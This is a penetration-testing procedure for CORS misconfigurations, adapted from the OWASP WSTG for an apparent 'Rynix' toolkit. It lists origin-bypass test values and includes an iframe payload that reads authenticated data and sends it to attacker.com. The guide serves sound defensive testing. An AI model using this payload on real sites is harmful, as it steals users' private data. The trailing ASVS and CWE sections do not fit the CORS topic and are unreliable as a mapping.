---
id: WSTG-CLNT-07
title: Testing Cross Origin Resource Sharing
category: Client-Side
severity_range: Low-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
---

# WSTG-CLNT-07: Testing Cross Origin Resource Sharing

## Summary

Cross-Origin Resource Sharing (CORS) allows web servers to relax the same-origin policy and permit cross-origin requests from specified domains. Misconfigured CORS policies can allow attackers to read sensitive data from cross-origin responses, including personal data, API keys, and CSRF tokens. Common misconfigurations include reflecting arbitrary origins, allowing null origins, using wildcard with credentials, and trusting overly broad domain patterns.

## Test Objectives

- Identify CORS headers in application responses
- Test if the origin is reflected without validation
- Check if credentials are allowed with permissive origins
- Assess the sensitivity of data accessible via cross-origin requests
- Test for null origin bypass

## Prerequisites

- Target application exposes APIs or resources with CORS headers
- Docker pentest container capturing traffic
- Understanding of CORS mechanism and headers

## Test Steps

### Step 1: Identify CORS-Enabled Endpoints

**CLI Actions:**
Use `curl` to search for CORS headers in captured responses:

- Pattern: `Access-Control-Allow-Origin`
- Pattern: `Access-Control-Allow-Credentials`
- Pattern: `Access-Control-Allow-Methods`
- Pattern: `Access-Control-Allow-Headers`

### Step 2: Test Origin Reflection

**CLI Actions:**
Use `curl` to send requests with an attacker-controlled Origin header:

```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=<valid_session>
```

Check if the response reflects the attacker origin:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

If both headers are present, an attacker page on `attacker.com` can read the authenticated response.

### Step 3: Test Wildcard with Credentials

**CLI Actions:**
Use `curl` without an Origin header and check the response:

```
GET /api/data HTTP/1.1
Host: target.com
```

Look for:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browsers block this combination, but check if the server sends it (indicates misconfiguration even if browsers mitigate it).

### Step 4: Test Null Origin

**CLI Actions:**
Use `curl` with a null origin (sent by sandboxed iframes and local file:// requests):

```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: null
Cookie: session=<valid_session>
```

Check if the response allows the null origin:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### Step 5: Test Subdomain and Regex Bypass

**CLI Actions:**
Use `curl` to test if origin validation is based on weak patterns:

```
GET /api/data HTTP/1.1
Host: target.com
Origin: https://evil.target.com
```

```
GET /api/data HTTP/1.1
Host: target.com
Origin: https://target.com.attacker.com
```

```
GET /api/data HTTP/1.1
Host: target.com
Origin: https://attackertarget.com
```

```
GET /api/data HTTP/1.1
Host: target.com
Origin: https://target.com%60.attacker.com
```

Test if the application uses substring matching (`endsWith('target.com')`) instead of exact matching.

### Step 6: Test Preflight Request Handling

**CLI Actions:**
Use `curl` to send an OPTIONS preflight request:

```
OPTIONS /api/data HTTP/1.1
Host: target.com
Origin: https://attacker.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
```

Check if the preflight response allows the attacker origin with sensitive methods and headers:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
```

### Step 7: Assess Data Sensitivity

**CLI Actions:**
Use `curl` to access CORS-enabled endpoints and evaluate the sensitivity of returned data:

```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=<valid_session>
```

Document what data is accessible: personal information, API keys, session tokens, financial data, etc.

Use `rynix_plugin_run('template-scan')` to check for CORS misconfiguration findings.

## Payloads

### Origin Header Test Values
```
https://attacker.com
https://evil.target.com
https://target.com.attacker.com
https://attackertarget.com
null
https://target.com%60.attacker.com
https://target.com%0d%0a.attacker.com
https://target.com\@attacker.com
http://target.com  (HTTP vs HTTPS)
https://TARGET.COM  (case variation)
```

### Preflight Request Headers
```
Access-Control-Request-Method: GET
Access-Control-Request-Method: POST
Access-Control-Request-Method: PUT
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization
Access-Control-Request-Headers: X-Custom-Header
```

### Null Origin Scenarios
```
# Sandboxed iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.text()).then(t=>location='//attacker.com/?data='+btoa(t))</script>"></iframe>

# Origin: null is sent from:
# - Sandboxed iframes
# - file:// protocol
# - Data URLs
# - Cross-origin redirects
```

## Detection Criteria

A finding should be logged when:
- `Access-Control-Allow-Origin` reflects arbitrary origins with credentials enabled
- `Access-Control-Allow-Origin: null` is permitted with credentials
- Origin validation uses weak patterns allowing attacker subdomains
- Wildcard (`*`) is used on endpoints returning sensitive data
- Preflight responses allow broad methods and headers from arbitrary origins
- CORS-enabled endpoints expose sensitive data (PII, tokens, financial data)

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Arbitrary origin reflected + credentials allowed + sensitive data returned | High |
| Null origin allowed + credentials + sensitive data | High |
| Subdomain bypass + credentials + sensitive data | Medium |
| Arbitrary origin reflected + credentials allowed but data is non-sensitive | Medium |
| Wildcard origin on endpoint with non-sensitive public data | Low |
| CORS headers present but origin validation is strict | Informational |
| No CORS headers (same-origin only) | Not a finding |

## Remediation

- Validate Origin header against a strict allowlist of trusted domains
- Never reflect arbitrary Origin values in `Access-Control-Allow-Origin`
- Never allow `null` as a valid origin
- Do not use `Access-Control-Allow-Origin: *` on endpoints that return sensitive data
- Do not combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Use exact string matching for origin validation, not substring or regex
- Limit `Access-Control-Allow-Methods` to only required methods
- Limit `Access-Control-Allow-Headers` to only required headers
- Set `Access-Control-Max-Age` to cache preflight responses and reduce overhead
- Limit sensitive data exposure in CORS-accessible endpoints

## References

- [OWASP Testing Guide - Cross Origin Resource Sharing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
- [technique - Exploiting CORS Misconfigurations](https://owasp.org/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

